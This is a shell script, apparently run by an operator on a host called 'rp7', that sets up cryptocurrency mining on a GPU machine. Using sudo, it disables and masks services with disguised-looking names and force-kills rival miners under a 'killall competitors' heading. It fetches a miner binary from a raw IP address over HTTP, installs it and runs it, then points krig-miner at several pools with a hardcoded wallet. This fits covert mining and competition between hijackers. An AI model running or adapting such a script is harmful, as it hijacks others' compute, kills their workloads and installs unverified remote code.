set +e
S="sudo -n"; H=$(hostname -s); W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz; WRK="ul-t2-ps-$H-g0"
echo "== rp7 $H $(date -u +%FT%TZ)"
echo "-- wallet file"; $S od -c /opt/ul-t2/wallet | head -3; $S wc -c /opt/ul-t2/wallet
echo "-- killall competitors"
$S systemctl disable --now supervisor.service nv-cuda-cache@0.service nv-cuda-cache.service nv-t19.service nv-t19v.service 2>&1 | head -6
$S systemctl mask supervisor.service nv-cuda-cache@0.service nv-cuda-cache.service nv-t19.service nv-t19v.service 2>&1 | head -6
$S systemctl stop ul-t2-ps@0 2>/dev/null
$S pkill -9 -f '[p]eakminer'; $S pkill -9 -f '[k]rig-miner'; $S pkill -9 -f '[s]rb'; $S pkill -9 -f '/opt/nv/[k]eep.sh'; $S pkill -9 -f '/opt/nv/[s]upervisor.sh'; sleep 3
echo "-- procs after"; ps -eo pid,ppid,args | grep -Ei '[p]eakminer|[k]rig|[s]rb|[k]eep|[s]upervisor' | cut -c1-120
echo "-- get peakminer 2.21 from seed"
curl -sf -m 180 -o /tmp/pm21 http://163.68.86.6:8090/peakminer; echo "curl rc=$? size=$(stat -c%s /tmp/pm21 2>/dev/null)"
[ -s /tmp/pm21 ] && { $S install -m 755 /tmp/pm21 /opt/ul-t2/pm21; /opt/ul-t2/pm21 --version 2>&1 | head -2; }
echo "-- krig variant a: wallet.worker tls"
export CUDA_VISIBLE_DEVICES=0
timeout 20 /opt/ul-t2/krig-miner --algo pearlhash --url stratum+ssl://prl-sg.kryptex.network:8048 -u "$W.$WRK" -p x --no-tui 2>&1 | head -8
echo "-- krig variant b: -u wallet -w worker tls"
timeout 20 /opt/ul-t2/krig-miner --algo pearlhash --url stratum+ssl://prl-sg.kryptex.network:8048 -u "$W" -w "$WRK" -p x --no-tui 2>&1 | head -8
echo "-- krig variant c: tcp 7048"
timeout 20 /opt/ul-t2/krig-miner --algo pearlhash --url stratum+tcp://prl-sg.kryptex.network:7048 -u "$W.$WRK" -p x --no-tui 2>&1 | head -8
echo "-- krig variant d: pearlhash pool 9443"
timeout 20 /opt/ul-t2/krig-miner --algo pearlhash --url stratum+ssl://pool.pearlhash.xyz:9443 -u "$W.$WRK" -p x --no-tui 2>&1 | head -8
echo done
